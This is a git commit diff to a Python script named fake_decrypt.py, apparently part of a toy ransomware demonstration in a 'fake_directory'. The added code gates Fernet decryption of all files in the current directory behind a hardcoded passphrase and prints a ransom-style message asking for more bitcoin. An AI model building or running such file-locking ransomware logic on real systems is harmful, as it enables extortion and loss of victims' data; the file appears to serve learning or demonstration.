49e793bc367d1cbbd232a2e5986c3debf678fd4c
davethegut <david.elgut@graylog.com>
2022-10-28 13:37:46 -0400

    updated scripts

--- scripts/fake_directory/fake_decrypt.py
+++ scripts/fake_directory/fake_decrypt.py
@@ -17,20 +17,35 @@ for file in os.listdir():
         files.append(file)
 
 
-print (files)
+#print (files)
 
 # here we are opening the secret_key as key and defining a new variable "secret_key"
 with open("secretkey.key", "rb") as key:
     secret_key = key.read()
+
+#here we are adding a pass phrase for the user to enter in order to have their files encrypted
+
+passphrase = "harry potter"
+
+user_phrase = input("What is the pass phrase - choose wisely and your files will be decrypted\n")
+
 
 # This for loop will check every file in the variable files 
 # Then we are opening the files in read binary with our function "thefile" 
 # Then we are using the variable "contents" to be equal to thefile.read
 # Then we are opening the files and decrypting them with fernet and our secret_key variable above
 # And then lastly we are writing the decrypted contents back to the file 
-for file in files:
-    with open(file, "rb") as thefile:
-        contents = thefile.read()
-    contents_decrypted = Fernet(secret_key).decrypt(contents)
-    with open(file, "wb") as thefile:
-        thefile.write(contents_decrypted)
+# We also added an if statement that when they enter the passphrase from
+# our variable above, then it will run the for loop
+if user_phrase == passphrase:
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_decrypted = Fernet(secret_key).decrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_decrypted)
+    print (files)
+
+    print ("Here you go, all of your files are back to normal; thanks for doing business with you.")
+else:
+    print ("Sorry, that is the wrong pass phrase. Send me more bitcoin and you can try again!")
